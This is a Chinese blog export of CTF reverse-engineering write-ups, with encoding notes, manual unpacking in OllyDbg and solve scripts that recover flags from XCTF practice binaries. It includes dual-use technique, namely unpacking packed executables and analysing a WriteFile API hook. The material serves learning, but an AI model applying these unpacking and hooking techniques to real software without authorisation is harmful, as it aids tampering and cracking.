对未保留字符的百分号编码未保留字符不需要百分号编码. 对百分号字符的百分号编码由于百分号字符(“%”)表示百分号编码字节流的存在, 因此百分号字符应该被编码为3个字节的序列：”%25”，用于URI内部(0x25为%的ascii码) 编码表可以简单的以ASCII码表为准(见下) URL编码_wiki百科 ASCII编码ASCII 由电报码发展而来，经过多次更新至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的控制字符。控制字符的用途主要是用来操控已经处理过的文字。可以简单的分为控制字符和可显示字符 用十进制来表示的话，031+127位为控制字符，32126为可显示字符，其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等 ASCII_wiki百科 Unicode码Unicode是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。 Unicode码扩展自ASCII字元集。Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。 Unicode最初打算作为ASCII的补充，可能的话，最终将代替它。 Unicode码一直在修正扩充，目前已经包含的文字有：阿拉伯字母、亚美尼亚字母、孟加拉文、注音符号、西里尔字母、天城文、格鲁吉亚字母、希腊字母、古吉拉特文、古木基文、谚文、希伯来字母、平假名、卡纳达文、片假名、寮文字、拉丁字母、马拉雅拉姆文、奥里亚文、泰米尔文、泰卢固文、泰文字、欧元符号、对象替换字符、切罗基文，吉兹字母，高棉字母，蒙古字母，缅文，欧甘字母，卢恩字母，僧伽罗文，叙利亚字母，它拿字母，加拿大原住民音节文字、彝文、部分盲文图案、德瑟雷特字母、哥特字母、古意大利字母、音乐符号、拜占庭音乐符号，中日韩统一表意文字、菲律宾文字布锡文、哈努诺文、他加禄文、塔格巴奴亚文、塞浦路斯音节文字，林布字母，线形文字B，奥斯曼亚字母，萧伯纳字母，德宏傣文，乌加里特字母、六十四卦、布吉文，格拉哥里字母，佉卢文，西双版纳傣文，古波斯文，锡尔赫特文、提非纳文 、古希腊音乐符号、巴厘文，楔形文字，西非书面文字，八思巴文、腓尼基字母、卡利亚文，占婆字母，克耶黎文，绒巴文，利西亚文，吕底亚文，桑塔利文，拉让文，索拉什特拉文，巽他文、瓦伊文、斐斯托斯圆盘，麻将、多米诺骨牌上的符号、阿维斯陀文，巴姆穆文字，埃及象形文字 （加汀纳符号表，涵盖1071个符号），亚拉姆文，巴拉维碑铭体，帕提亚碑铭体，爪哇文，凯提文，老傈僳文，曼尼普尔文，南阿拉伯字母，古突厥文，撒玛利亚字母，老傣文、傣越文。、巴塔克字母，婆罗米文字，曼达字母，纸牌符号，交通标志，地图符号，炼金术符号，颜文字、绘文字、查克马字母，麦罗埃文，麦罗埃象形文字，柏格理苗文，夏拉达文，索拉僧平文字、泰克里文、土耳其里拉符号、5个双向排版符号、巴萨字母，高加索阿尔巴尼亚字母，杜普雷严速记，爱尔巴桑字母，古兰塔文，可吉文，库达瓦迪文，线形文字A，马哈佳尼文，摩尼教字母，门得文字，莫迪字母，默文，纳巴泰字母，古北阿拉伯文，古彼尔姆文，杨松录苗文，帕米拉文字，袍清豪文，诗篇巴列维文，悉昙文字，底罗仆多文，瓦兰齐地文、装饰符号、阿洪姆文，安纳托利亚象形文字，哈坦文，穆尔塔尼文，古匈牙利字母，书写符号、切罗基文小写字母，以及五种绘文字肤色修改字符、阿德拉姆字母，比奇舒奇文，象雄文，尼泊尔纽瓦字母，欧塞奇字母，西夏文、绘字文、札那巴札尔、索永布文字、马萨拉姆贡德文字、女书、变体假名（非标准平假名）、多格拉文、格鲁吉亚文骑士体大写字母、贡贾拉贡德文、哈乃斐罗兴亚文字、望加锡文、梅德法伊德林文、老粟特文、粟特文、埃利迈文、南迪城文、创世纪苗文、文乔文、花剌子模语、迪维西语的岛字母、契丹小字、库尔德语字母的Yezidi体、书写豪萨语用的阿拉伯附加字母、沃洛夫语、其他非洲语言、在巴基斯坦书写印德科语和旁遮普语的补充字符、粤语用的注音符号、共享创意授权符号、七十或八十年代电讯用图符。 Unicode编码系统可分为编码方式和实现方式两个层次。目前实际应用的统一码版本对应于UCS-2，使用16位的编码空间。也就是每个字符占用2个字节。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。基本多文种平面的字符的编码为U+hhhh，其中每个h代表一个十六进制数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为Unicod转换格式（Unicode Transformation Format，简称为UTF）。 Unicode_wiki百科 base64Base64是一种基于64个可打印字符来表示二进制数据的表示方法。每6个比特为一个单元，Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。 编码“Man” 文本 M A N ASCII编码 77 97 110 二进制位 0 1 0 0 1 1 0 1 0 1 1 0 0 0 0 1 0 1 1 0 1 1 1 0 索引 19 22 5 46 Base64编码 T W F u 在此例中，Base64算法将3个字节编码为4个字符。 Base64索引表： 数值 字符 数值 字符 数值 字符 0 A 16 Q 32 g 48 w 1 B 17 R 33 h 49 x 2 C 18 S 34 i 50 y 3 D 19 T 35 j 51 z 4 E 20 U 36 k 52 0 5 F 21 V 37 l 53 1 6 G 22 W 38 m 54 2 7 H 23 X 39 n 55 3 8 I 24 Y 40 o 56 4 9 J 25 Z 41 p 57 5 10 K 26 a 42 q 58 6 11 L 27 b 43 r 59 7 12 M 28 c 44 s 60 8 13 N 29 d 45 t 61 9 14 O 30 e 46 u 62 + 15 P 31 f 47 v 63 / 大致过程：先将文本转为ascii码，再转为8位2进制数，再取其中6位得出对应的十进制数，再通过索引表中转换为字符 如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。 base64解码在线解码编码网站 base64_python想将字符串转编码成base64,要先将字符串转换成二进制数据url &#x3D; &quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songzhixue&#x2F;&quot;bytes_url &#x3D; url.encode(&quot;utf-8&quot;)str_url &#x3D; base64.b64encode(bytes_url) # 被编码的参数必须是二进制数据print(str_url)b&#39;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8&#x3D;&#39; 将base64解码成字符串import base64url &#x3D; &quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8&#x3D;&quot;str_url &#x3D; base64.b64decode(url).decode(&quot;utf-8&quot;)print(str_url)&#39;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songzhixue&#x2F;&#39;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"BabyXor&OD手动脱壳","slug":"BabyXor&OD手动脱壳","date":"2020-12-10T08:42:49.781Z","updated":"2021-01-11T01:42:17.969Z","comments":true,"path":"2020/12/10/BabyXor&OD手动脱壳/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/10/BabyXor&OD%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/","excerpt":"题目虽然常规，但是学到了一些关于手动脱壳的知识。","text":"题目虽然常规，但是学到了一些关于手动脱壳的知识。 脱壳过程查看文件，发现是奇奇怪怪的壳，于是我们用OD手动脱壳. 将文件拖入OD 这里利用ESP脱壳大法，下面说一说ESP脱壳的具体步骤。 ESP定理脱壳（ESP在OD的寄存器中，我们只要在命令行下ESP的硬件访问断点，就会一下来到程序的OEP了！） （1）开始就点F8，注意观察OD右上角的寄存器中ESP有没突现（变成红色）（这只是一 般情况下，更确切的说我们选择的ESP值是关键句之后的第一个ESP值） （2）在命令行下：dd XXXXXXXX(指在当前代码中的ESP地址，或者是hr XXXXXXXX)， 按回车 （3）选中下断的地址，断点—&gt;硬件访问—&gt;WORD断点 （4）按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP 按下F8单步步过，发现ESP此时是红色，记下此时ESP寄存器中的值0019FF54（载入程序处的下一个ESP是红色，当然每个人机器上运行这个值有可能不同） 在命令行下输入dd 0019FF54，然后按下回车键 选中要下断点的0019FF54那行，依次选择断点 -&gt; 硬件访问 -&gt; Word 在菜单栏调试（D）下的硬件断点（H）下选项下可以看到我们设置的硬件断点 按F9运行，然后我们F8单步走，到了有大跳转时不要再按F8了（这是向上跳转的），我们必须跳过去，因为接下来就有可能是程序的OEP领空 这里有更多关于ESP定律的资料 https://blog.csdn.net/qiurisuixiang/article/details/7649799 https://beikeit.com/post-614.html 静态分析把已经脱壳的exe文件拖入ida中 先分析重要函数 v1 = sub_40108C((int)&amp;unk_435DC0, 56);v2 = (char *)sub_401041((int)&amp;unk_435DC0, (int)&amp;dword_435DF8, 0x38u);v3 = malloc(0x64u);v4 = strlen(v2);memcpy(v3, v2, v4);v5 = sub_4010C3(&amp;unk_435DC0, v2, &amp;dword_435E30, 56);sub_40101E(v1, v2, v5); 找到这些重要的函数先看传参,并找出其关联 访问&amp;unk_435DC0 显然这是一个数组,不过在这之间,和我一样的小菜鸡们注意了,怎么找值1.找类型,此处类型为db,及占4个字节,及是以四个字节为媒介进行分开2.看地址,上图是一个地址一个地址进行分开3.看端序,及所谓小端序(高到低)和大端序(低到高)又上面3个要点可以得到 435DC0&#x3D;[0x66,0x6d,0x63,0x64,0x7f,0x37,0x35,0x30,0x30,0x6b,0x3a,0x3c,0x3b,0x20] 访问&amp;dword_435DF8 435DF8&#x3D;[0x37,0x6f,0x38,0x62,0x36,0x7c,0x37,0x33,0x34,0x76,0x33,0x62,0x64,0x7a] 访问dword_435E30得到 435E30&#x3D;[0x1a,0,0,0x51,0x5,0x11,0x54,0x56,0x55,0x59,0x1d,0x9,0x5d,0x12,0,0] 提取完数据我们看逻辑 sub_40108C函数 化成代码： a1 = unk_435DC0char *v3v3 = malloc(56&gt;&gt;2) // 56&gt;&gt;2 = 14for(i = 0; i &lt;14 ; ++i) sprintf(&amp;v3[i],\"%c\",i^*(a1 + 4*i)) a1 = [102, 109, 99, 100, 127, 55, 53, 48, 48, 107, 58, 60, 59, 32 ] 解这个函数 a1 = [102, 109, 99, 100, 127, 55, 53, 48, 48, 107, 58, 60, 59, 32 ]flag = ''for i in range(14): flag += chr(a1[i]^i) sub_401041((int)&amp;unk_435DC0, (int)&amp;dword_435DF8, 0x38u)函数 image-20201210173449644 化成代码 char *v5;v5 = malloc(56);printf(\"%c\",*a2[0])for (i = 1;i&lt;14;++i) sprintf(&amp;v5[i],\"%c\",*(a1 + 4* i)^*(a2 + 4*i)^*(a1+ 4*i -4)) 解这个函数 a2 = [55, 111, 56, 98, 54, 124, 55, 51, 52, 118, 51, 98, 100, 122]temp = []flag += chr(a2[0])temp.append(a2[0])for i in range (1,14): x = (a1[i]^a2[i]^a1[i-1]) flag += chr(x) temp.append(x) 最后一个函数sub_4010C3((int)&amp;unk_435DC0, (int)v3, (int)&amp;dword_435E30, 56) image-20201210173723720 解函数 a3 = [26,0,0,81,5,17,84,86,85,89,29,9,93,18,0,0]for i in range(13): x += chr(a3[i+1]^temp[i]^i) flag += chr(a3[i]^a2[i]) + x 完整的exp a1 = [102, 109, 99, 100, 127, 55, 53, 48, 48, 107, 58, 60, 59, 32 ]a2 = [55, 111, 56, 98, 54, 124, 55, 51, 52, 118, 51, 98, 100, 122]a3 = [26,0,0,81,5,17,84,86,85,89,29,9,93,18,0,0]temp=[]flag=''for i in range(14): flag+=chr(a1[i]^i)flag+=chr(a2[0])temp.append(a2[0])for i in range(1,14): x=a1[i]^a2[i]^a1[i-1] flag+=chr(x) temp.append(x)x=''for i in range(13): x+=chr(a3[i+1]^(temp[i])^i)flag+= chr(a3[0] ^ a2[0]) + xprint(flag)# flag&#123;2378b077-7d6e-4564-bdca-7eec8eede9a2&#125; 动态分析其实也可以用动态调试的方法做，在三个函数的位置分别下断点 把得到的flag拼凑到一起即为答案。 刚刚发现自己脱壳出来的exe文件无法在od里动调，所以我试不了这种方法，图是偷的别人的。至于为什么动调不了等我回去问问大佬们吧。心态有一点小炸裂，无语凝噎！！！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"寒假之前的计划","slug":"寒假之前的计划","date":"2020-12-02T09:07:38.653Z","updated":"2020-12-02T09:17:54.019Z","comments":true,"path":"2020/12/02/寒假之前的计划/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/02/%E5%AF%92%E5%81%87%E4%B9%8B%E5%89%8D%E7%9A%84%E8%AE%A1%E5%88%92/","excerpt":"要认真对待！","text":"要认真对待！ 认真学习密码学，网安课本，网安密码实验要认真复现 熟悉java语言的基本语法，加强写python代码的能力 明确考研计划 认真学习英语，坚持背单词刷题 减少打CTF的时间(寒假前不会利用课余时间学习CTF了) 寒假之后准备入门一下pwn 减少喝酒，嗨皮次数","categories":[{"name":"杂谈","slug":"杂谈","permalink":"https://github.com/gha01un/gha01un.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"plan","slug":"plan","permalink":"https://github.com/gha01un/gha01un.github.io/tags/plan/"}],"author":"H1un"},{"title":"XCTF进阶区","slug":"XCTF高手区","date":"2020-12-01T06:36:35.240Z","updated":"2021-01-11T01:42:51.158Z","comments":true,"path":"2020/12/01/XCTF高手区/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/01/XCTF%E9%AB%98%E6%89%8B%E5%8C%BA/","excerpt":"实验课继续水一水！","text":"实验课继续水一水！ XCTF逆向进阶区第二页也快做完了，实验课赶紧补一补wp吧 elrond32拖入ida中查看main函数 看见Access granted显然可知sub_8048538()函数是输出flag的函数，点开看看 看代码发现我们需要得到数组a2的值，于是回到main函数，发现a2与sub_8048414()函数有关，点开看看 分析函数写出代码！ 继续分析sub_8048538()函数，发现我们还需要知道v2数组的值，根据代码 qmemcpy(v2, &amp;unk_8048760, sizeof(v2)); 知道v2是从unk_8048760处复制了33个int查看unk_8048760的值 一个int占4个内存，所以剩下3个的内存用0填充，最后得出 data=[0x0F,0x1F,0x04,0x09,0x1C,0x12,0x42,0x09,0x0C,0x44,0x0D,0x07,0x09,0x06,0x2D,0x37,0x59,0x1E,0x00,0x59,0x0F,0x08,0x1C,0x23,0x36,0x07,0x55,0x02,0x0C,0x08,0x41,0x0A,0x14] 编写代码得到flag a='ie ndags r'x=0s=[]for i in range(9): x=7*x%11 s.append(a[x]) x+=1print(''.join(s))data=[0x0F,0x1F,0x04,0x09,0x1C,0x12,0x42,0x09,0x0C,0x44,0x0D,0x07,0x09,0x06,0x2D,0x37,0x59,0x1E,0x00,0x59,0x0F,0x08,0x1C,0x23,0x36,0x07,0x55,0x02,0x0C,0x08,0x41,0x0A,0x14]for i in range(33): print(chr(ord(s[i%8])^data[i]),end='') tt3441810这题根本不是逆向题 用01editor打开 所以这道题的16进制转ASCII码又是一堆16进制，那我们把得到的16进制转ASCII 得到了很奇怪的输出，HH4$HH重复出现。 text=[0x68, 0x66, 0x6C, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x61, 0x67, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7B, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x6F, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x6F, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x72, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x65, 0x74, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7D, 0x0A, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31, 0xFF, 0x48, 0xB8, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05 ]t=[]s=''for x in text: if x&gt;=32 and x&lt;=125: t.append(x)for i in t: s+=chr(i)print(s)s=s.replace('HH4$HH','')print(s)s=s.replace('h','')print(s) re2-cpp-is-awesome一道c++的题目，这道题我在给新生赛出逆向题目的时候写过类似样子的源码，所以比较的熟悉。 打开ida查看主函数 大部分都是些没有用的代码，第27行代码，是一个for循环，没有结束条件，每次增加sub_400D7A(&amp;i)，即1字节 _QWORD *__fastcall sub_400D7A(_QWORD *a1)&#123; ++*a1; return a1;&#125; for ( i &#x3D; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v11); ; sub_400D7A(&amp;i) )&#123; v13 &#x3D; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v11); if ( !sub_400D3D((__int64)&amp;i, (__int64)&amp;v13) )&#x2F;&#x2F; 循环结束条件 break; v8 &#x3D; (_BYTE *)sub_400D9A((__int64)&amp;i); &#x2F;&#x2F; 进行某种赋值 if ( *v8 !&#x3D; off_6020A0[dword_6020C0[v14]] ) &#x2F;&#x2F; 重点！这里实际上就是一个数组套着数组 sub_400B56(&amp;i, &amp;v13); ++v14; &#x2F;&#x2F; 数组下标&#125; 通过对比sub_400B56(&amp;i, &amp;v13);和 sub_400B73(&amp;i, &amp;v13);函数，我们能够得到flag实际藏在if判断条件中 void __fastcall __noreturn sub_400B56(__int64 a1, __int64 a2, __int64 a3)&#123; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Better luck next time\\n&quot;, a3); exit(0);&#125; __int64 __fastcall sub_400B73(__int64 a1, __int64 a2, __int64 a3)&#123; return std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You should have the flag by now\\n&quot;, a3);&#125; 进入off_6020A0和dword_6020C0我们可以看到 因此我们可以分析得出，通过v15/v14作为内部数组下标，循环获到的整数再作为外部数组的下标，获取到需要的字符串。 这里值得注意的一点是，algn 8表示两个数之间间隔8位，相当于在两个数之间插了7个0，也就相当于在头两个数之间还有一个’0’ 写出脚本 S = 'L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_'N = [0x24,0x0,0x5,0x36,0x65,0x7,0x27,0x26,0x2d,0x1,0x3,0x0,0x0d,0x56,0x1,0x3,0x65,0x3,0x2d,0x16,0x2,0x15,0x3,0x65,0x0,0x29,0x44,0x44,0x1,0x44,0x2b]x = ''for i in N: x += S[i]print(x) re4-unvm-mepyc在线pyc转 #!/usr/bin/env python# visit http://tool.lu/pyc/ for more informationimport md5md5s = [ 0x831DAA3C843BA8B087C895F0ED305CE7L, 0x6722F7A07246C6AF20662B855846C2C8L, 0x5F04850FEC81A27AB5FC98BEFA4EB40CL, 0xECF8DCAC7503E63A6A3667C5FB94F610L, 0xC0FD15AE2C3931BC1E140523AE934722L, 0x569F606FD6DA5D612F10CFB95C0BDE6DL, 0x68CB5A1CF54C078BF0E7E89584C1A4EL, 0xC11E2CD82D1F9FBD7E4D6EE9581FF3BDL, 0x1DF4C637D625313720F45706A48FF20FL, 0x3122EF3A001AAECDB8DD9D843C029E06L, 0xADB778A0F729293E7E0B19B96A4C5A61L, 0x938C747C6A051B3E163EB802A325148EL, 0x38543C5E820DD9403B57BEFF6020596DL]print 'Can you turn me back to python ? ...'flag = raw_input('well as you wish.. what is the flag: ')if len(flag) &gt; 69: print 'nice try' exit()if len(flag) % 5 != 0: print 'nice try' exit()for i in range(0, len(flag), 5): s = flag[i:i + 5] if int('0x' + md5.new(s).hexdigest(), 16) != md5s[i / 5]: print 'nice try' exit() continueprint 'Congratz now you have the flag' 16进制转md5，在线工具直接解 流浪者根据字符串的查找，找到关键函数。 x交叉引用，找到引用了sub_4017f0的函数 分析函数 for ( i = 0; Str[i]; ++i ) &#123; if ( Str[i] &gt; 57 || Str[i] &lt; 48 ) &#123; if ( Str[i] &gt; 122 || Str[i] &lt; 97 ) &#123; if ( Str[i] &gt; 90 || Str[i] &lt; 65 ) sub_4017B0(); // 错误 else // 65-90 +29 v5[i] = Str[i] - 29; // 大写 &#125; else &#123; // 97-122 +87 v5[i] = Str[i] - 87; // 小写 &#125; &#125; else &#123; // 48-57 +48 v5[i] = Str[i] - 48; // 数字-‘0‘ &#125; &#125; return sub_4017F0(v5);&#125; 写出解题脚本 tab='abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ'tg='KanXueCTF2019JustForhappy'temp=[]for i in range(len(tg)): temp.append(tab.index(tg[i]))print(temp)flag=''for c in temp: if c&gt;=65-29 and c&lt;=90-29: c+=29 elif c&gt;=97-87 and c&lt;=122-87: c+=87 elif c&gt;=48-48 and c&lt;=57-48: c+=48 flag+=chr(c)print (flag) 666没啥好解释的，拖入ida查看主函数，main函数中，用户输入保存到v5。然后调用encode(&amp;v5,&amp;s)函数。 在判断中，首先比较用户输入的长度是否等于key，也就是18。然后比较了s和enflag是否相等。s应该是刚刚调用encode函数后得到的。enflag的值为izwhroz&quot;&quot;w&quot;v.K&quot;.Ni 其中，key的值为18，enflag的值为izwhroz&quot;&quot;w&quot;v.K&quot;.Ni： 现在来看看encode函数。a1也就是main函数里用户的输入v5，a2是main函数里的s，是最后要比较的字符串。首先呢，检查了一下用户输入的长度，必须为key。然后在一个for循环中，每次取用户输入的三个字符，分别做相关的异或运算，再分别赋值给a2的对应的位置。 对应写出脚本,这里分别用c和py分别写出相应代码。 #include&lt;stdio.h&gt;int main()&#123;char i;char target[]=\"izwhroz\\\"\\\"w\\\"v.K\\\".Ni\";for(i=0;i&lt;18;i+=3)&#123; target[i]=(target[i]^18)-6; target[i+1]=(target[i+1]^18)+6; target[i+2]=(target[i+2]^18)^6;&#125;puts(target);return 0;&#125; enflag=[105, 122, 119, 104, 114, 111, 122, 34, 34, 119, 34, 118, 46, 75, 34, 46, 78, 105, 0]flag=''for i in range(0,18,3): flag+=chr((18^enflag[i])-6) flag+=chr((18^enflag[i+1])+6) flag+=chr(18^enflag[i+2]^6) print(flag) ReverseMe-120打开ida，首先查看一下程序逻辑 可以看到成功的条件是v9，而v9是v13与字符串”you_know_how_to_remove_junk_code“比较的结果。然后追一下v13的数据流，看看v13是怎么来的 可以看到v13的定义，以及一个关键函数sub_401000，为什么说是关键函数呢，因为函数的参数包含了刚定义的v13，以及你的输入v11。 我们跟进去看一看，注意我们想知道的是v13是怎么得到的，而v13作为第二个参数，在函数sub_401000里是a2，我们顺着a2去看。 发现是base64加密。参考笔记： 写出解密脚本 import base64s='you_know_how_to_remove_junk_code'tmp=''for i in range(len(s)): tmp+=chr(ord(s[i])^0x25)print(base64.b64encode(tmp.encode('utf-8'))) EASYHOOK IDA 打开，F5 分析 main 函数如下 image-20201202163002260 大概分析可得，输入的 flag 长度应为 19，长度验证正确后会先调用 sub_401220 函数，该函数功能未知。然后通过 CreateFileA 和 WriteFile 将输入的 flag 写入到一个文件里面，双击 FileName 可知是写入到本地目录下的 Your_Input 文件里面。接着调用 sub_401240 函数，因为传入了 buffer 和NumberOfBytesWritten 的地址，结合紧跟着 sub_401240 后面的一个关键判断，所以很可能 sub_401240 就是对 flag 进行验证的关键函数了。 从上面分析得知，输入的长度为 19 的 flag 会被写入到文件里面。然而测试之后发现，写入到文件里面的 flag 发生了改变。回顾 main 函数的执行流程，可知对 flag 的修改要么发生在 sub_401220 函数里面，要么是WriteFile 函数出了问题。由于题目的名称给出了 hook 的提示信息，于是猜测在 sub_401220 里面 hook 了WriteFile 函数。直接 F5 分析 sub_401220 函数，报错。查看汇编代码得知猜测正确，分析如下： image-20201202163322284 在 sub_401220 中获取进程句柄后跳转到loc_4011B0。 image-20201202163345312 在 loc_401180 里面通过GetProcAddress 获取WriteFile 的地址，然后调用了sub_4010D0。注意红框框处的几个数据。 F5 查看 sub_4010D0，可知调用 VirtualProtectEx和 WriteProcessMemory 修改了 WriteFile 函数的起始 5 个字节。动态调试后发现修改为跳转到 sub_401080 的一条无条件跳转指令，从而实现了 hook WriteFile 的功能。 image-20201202163510734 首先调用 sub_401000 函数，分析参数传递可知参数 lpBuffer 即是我们输入的 flag，那么很有可能就是在 sub_401000 里面对 flag 进行了修改。然后调用 sub_401140 函数，接着又一次调用了WriteFile 函数。我们知道虽然 WriteFile 被 hook 了，但最后确实是把 flag 写入到了文件里面，所以很有可能是在 sub_401140 里面对 WriteFIle 进行了 hook 还原。最后对 sub_401000 的返回值进行判断，如果非 0 则将NumberOfBytesWritten 置 1。 先分析sub_401140，证实了里面的 hook 还原操作。然后看一下 sub_401000，可知里面主要是两个循环处理： image-20201202163602738 这里就有一个很明显的字符串比较的意图了，结合上面的分析可知，我们输入的长度为 19 的 flag 经过第一个循环的处理之后，如果和 byte_40A030 指向的全局字符串相同，那么 sub_401000 返回 1。在 sub_401080 里面对sub_401000 的返回值进行判断，如果返回值为 1，则将NumberOfBytesWritten 置 1。然后在最外层的 main函数里面进行判断，如果NumberOfBytesWritten 为 1，则输出正确的提示信息。 所以，我们只需要将 byte_40A030 指向的字符串做一次 sub_401000 函数里面第一个循环处理的逆运算，就可以得到输入正确的 flag 了。 当然别忘了在 main 函数里面的 sub_401240 函数，我们刚开始时分析认为在 sub_401240 里面对输入的 flag 做了关键验证，但事实上真正的验证函数是 sub_401000，只要 sub_401000 验证正确即可。 贴上脚本分别用py和c分别实现 data=[ 0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F, 0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, 0x6D, 0x4C, 0x6E, 0x00]data[18]^=0x13for i in range(17,-1,-1): t=i^data[i] if i%2: data[i]=t+i else: data[i+2]=tprint(''.join(map(chr,data))) 